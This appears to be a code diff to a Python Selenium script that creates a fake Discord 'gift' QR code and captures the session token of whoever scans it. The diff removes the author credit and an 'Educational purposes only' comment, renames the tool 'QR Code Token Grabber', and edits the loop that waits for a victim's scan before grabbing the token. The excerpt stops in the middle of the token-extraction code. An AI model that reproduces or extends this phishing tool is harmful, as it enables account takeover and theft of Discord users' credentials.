@@ -5,9 +5,6 @@ import base64
 import time
 import os
 
-# Developer: NightfallGT
-# Educational purposes only
-
 def logo_qr():
     im1 = Image.open('temp/qr_code.png', 'r')
     im2 = Image.open('temp/overlay.png', 'r')
@@ -22,8 +19,7 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print('github.com/NightfallGT/Discord-QR-Scam\n')
-    print('** QR Code Scam Generator **')
+    print('QR Code Token Grabber')
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
@@ -55,7 +51,9 @@ def main():
     print('Send the QR Code to user and scan. Waiting..')
     
     while True:
-        if discord_login != driver.current_url:
+        if not driver:
+            print("Exit")
+        if discord_login != driver.current_url and driver:
             print('Grabbing token..')
             token = driver.execute_script('''
 
